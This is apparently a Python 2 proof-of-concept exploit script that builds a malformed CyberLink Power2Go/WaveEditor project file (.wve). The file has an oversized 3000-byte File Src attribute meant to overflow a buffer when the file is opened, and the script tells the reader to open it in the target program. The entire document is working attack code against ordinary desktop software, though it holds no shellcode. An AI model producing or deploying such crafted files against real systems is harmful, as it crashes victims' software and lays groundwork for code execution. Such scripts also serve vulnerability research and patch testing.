#!/usr/bin/python
# 
# Tested on Windows XP SP3 with:
# WaveEditor 2.0 (build 2204) comes with Power2Go 8.0.0 (build 1031)
# 

import time
filename = "overflow.wve"

header = ("\x3c\x50\x72\x6f\x6a\x65\x63\x74\x20\x41\x70\x70\x6c\x69\x63\x61"
"\x74\x69\x6f\x6e\x3d\x22\x57\x61\x76\x65\x45\x64\x69\x74\x6f\x72\x22\x20"
"\x56\x65\x72\x73\x69\x6f\x6e\x3d\x22\x32\x2e\x30\x22\x3e")

junk = "A" * 3000

hell = "\x3c\x46\x69\x6c\x65\x20\x53\x72\x63\x3d" # <File Src=
hell += '"'+ junk + '"'

fill = ("\x3c\x42\x6f\x6f\x6b\x6d\x61\x72\x6b\x4c\x69\x73\x74\x2f\x3e\x3c"
"\x2f\x46\x69\x6c\x65\x3e\x3c\x2f\x50\x72\x6f\x6a\x65\x63\x74\x3e")

payload = header + hell + fill

print "CyberLink Power2Go <=2.0 File Project Processing (.wve) Overflow POC"
print "[*] by modpr0be <modpr0be[at]spentera.com>\r\n"
print "[*] Preparing the file.."
time.sleep(1)
f = open(filename,'w')
try:
	f.write(payload)
	print "[+] File", filename, "successfully created!"
	print "[*] Now open project file", filename, "with CyberLink Power2Go."
	print "[*] Good luck ;)"
	f.close()
except IOError:
	print "[-] Could not write to destination folder, check permission.."
	sys.exit()